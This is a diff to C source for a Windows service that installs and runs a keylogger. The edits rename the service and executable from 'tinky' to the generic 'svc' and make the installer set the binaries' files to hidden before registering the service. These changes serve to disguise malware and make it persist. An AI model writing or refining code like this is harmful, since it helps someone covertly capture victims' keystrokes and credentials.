@@ -3,7 +3,7 @@
 #include <tlhelp32.h>
 #include <shlobj.h>
 
-#define SERVICE_NAME "tinky"
+#define SERVICE_NAME "svc"
 #define _WIN32_WINNT 0x0A00
 #define _WIN32_WINNT_WIN10_TH2 0x0A00
 #define _WIN32_WINNT_WIN10_RS1 0x0A00
@@ -17,7 +17,7 @@ SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 HANDLE hKeyloggerProcess = NULL;
 
-#define NEW_TINKY_EXE "C:\\tinky.exe"
+#define NEW_TINKY_EXE "C:\\svc.exe"
 
 char TINKY_EXE[MAX_PATH];
 char WINKY_EXE[MAX_PATH];
@@ -32,13 +32,12 @@ void SetTinkyPath(void)
 
     strncpy(WINKY_EXE, TINKY_EXE, MAX_PATH);
 
-    char* tinkyPosition = strstr(WINKY_EXE, "tinky\\tinky.exe");
+    char* tinkyPosition = strstr(WINKY_EXE, "tinky\\svc.exe");
     if (tinkyPosition)
     {
         strncpy(tinkyPosition, "winkey\\winkey.exe", MAX_PATH - (tinkyPosition - WINKY_EXE));
     }
 }
-
 
 int InstallService(void)
 {
@@ -298,7 +297,6 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     }
 }
 
-
 void HideFiles(void)
 {
     SetFileAttributes(TINKY_EXE, FILE_ATTRIBUTE_HIDDEN);
@@ -364,8 +362,8 @@ int main(int argc, char* argv[])
     {
         if (strcmp(argv[1], "install") == 0)
         {
-            InstallService();
             HideFiles();
+            InstallService();
             return 0;
         }
         else if (strcmp(argv[1], "delete") == 0)
